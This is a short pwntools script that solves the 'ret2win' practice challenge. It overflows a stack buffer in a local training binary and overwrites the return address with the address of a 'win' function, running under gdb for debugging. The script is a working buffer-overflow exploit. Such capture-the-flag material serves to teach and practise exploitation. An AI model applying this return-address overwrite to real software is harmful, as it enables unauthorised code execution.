from pwn import *

# change this with the actual filename
exe = ELF("./ret2win")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")

# Context setup
context.log_level = 'debug'
context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]  # For debugging in tmux
global p

def conn():
    p = gdb.debug(exe.path, gdbscript="""
        set disassembly-flavor intel
        set pagination off
    """)
    return p


p = conn()

winFunc = 0x00400756

p.recvuntil("> ")

payload = b"A" * 0x20

payload += b"B" * 0x8

payload += p64(winFunc)

p.sendline(payload)

p.interactive() # Keep interaction open
